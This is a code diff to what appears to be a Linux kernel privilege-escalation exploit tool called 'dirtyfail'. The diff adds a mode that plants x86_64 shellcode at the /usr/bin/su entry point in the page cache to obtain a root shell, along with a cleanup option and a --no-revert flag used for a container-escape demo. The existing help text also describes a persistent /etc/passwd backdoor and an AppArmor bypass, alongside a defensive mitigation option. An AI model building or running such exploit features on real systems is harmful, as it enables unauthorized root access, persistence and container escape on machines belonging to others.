@@ -31,6 +31,7 @@
 #include "apparmor_bypass.h"
 #include "backdoor.h"
 #include "mitigate.h"
+#include "exploit_su.h"
 
 #include <getopt.h>
 #include <fcntl.h>
@@ -69,8 +70,14 @@ static void usage(const char *prog)
 "  --exploit-backdoor     PERSISTENT: insert dirtyfail::0:0:..:/:/bin/bash\n"
 "                         into /etc/passwd page cache; survives shell exit\n"
 "                         until page eviction. Use --cleanup-backdoor to revert.\n"
+"  --exploit-su           V4bel-style: plant x86_64 shellcode at /usr/bin/su\n"
+"                         entry point in page cache; running su then yields\n"
+"                         a /bin/sh root shell. No PAM dependency. Saves\n"
+"                         original 48 bytes to /var/tmp/.dirtyfail-su.state\n"
+"                         for revert via --cleanup-su.\n"
 "  --cleanup              evict /etc/passwd from page cache and drop_caches\n"
 "  --cleanup-backdoor     restore /etc/passwd line from /var/tmp/.dirtyfail.state\n"
+"  --cleanup-su           restore /usr/bin/su entry-point bytes from state file\n"
 "  --mitigate             DEFENSIVE: blacklist algif_aead/esp4/esp6/rxrpc,\n"
 "                         set apparmor_restrict_unprivileged_userns=1.\n"
 "                         Requires root. Side-effect: breaks IPsec/AFS.\n"
@@ -86,6 +93,9 @@ static void usage(const char *prog)
 "                         hardened distros, so may take ~5-10s.\n"
 "  --no-shell             after a successful exploit, do NOT execve `su`;\n"
 "                         instead revert the page-cache patch and exit\n"
+"  --no-revert            with --no-shell, also skip the auto-revert\n"
+"                         (leaves the page cache poisoned — used by\n"
+"                         tools/dirtyfail-container-escape.sh demo)\n"
 "  --no-color             disable ANSI color in output\n"
 "  --aa-bypass            force the AppArmor unprivileged-userns bypass\n"
 "                         (auto-armed when restricted profile is detected)\n"
@@ -113,8 +123,10 @@ enum mode {
     MODE_EXPLOIT_RXRPC,
     MODE_EXPLOIT_GCM,
     MODE_EXPLOIT_BACKDOOR,
+    MODE_EXPLOIT_SU,
     MODE_CLEANUP,
     MODE_CLEANUP_BACKDOOR,
+    MODE_CLEANUP_SU,
     MODE_MITIGATE,
     MODE_CLEANUP_MITIGATE,
     MODE_HELP,
@@ -185,6 +197,9 @@ int main(int argc, char **argv)
         {"mitigate",          no_argument, NULL, 15 },
         {"cleanup-mitigate",  no_argument, NULL, 16 },
         {"active",            no_argument, NULL, 17 },
+        {"exploit-su",        no_argument, NULL, 18 },
+        {"cleanup-su",        no_argument, NULL, 19 },
+        {"no-revert",         no_argument, NULL, 20 },
         {"no-shell",         no_argument, NULL, 'n'},
         {"no-color",         no_argument, NULL, 'C'},
         {"aa-bypass",        no_argument, NULL,  8 },
@@ -213,6 +228,9 @@ int main(int argc, char **argv)
             case 15 :  m = MODE_MITIGATE;         break;
             case 16 :  m = MODE_CLEANUP_MITIGATE; break;
             case 17 :  dirtyfail_active_probes = true; break;
+            case 18 :  m = MODE_EXPLOIT_SU;       break;
+            case 19 :  m = MODE_CLEANUP_SU;       break;
+            case 20 :  dirtyfail_no_revert = true; break;
             case 'n':  do_shell = false;          break;
             case 'C':  dirtyfail_use_color = false; break;
             case  8 :  aa_bypass = true;          break;
@@ -321,6 +339,15 @@ int main(int argc, char **argv)
 
     case MODE_CLEANUP_BACKDOOR:
         r = backdoor_cleanup();
+        break;
+
+    case MODE_EXPLOIT_SU:
+        log_warn("planting x86_64 shellcode at /usr/bin/su entry point (page cache)");
+        r = exploit_su_shellcode(do_shell);
+        break;
+
+    case MODE_CLEANUP_SU:
+        r = cleanup_su_shellcode();
         break;
 
     case MODE_MITIGATE:
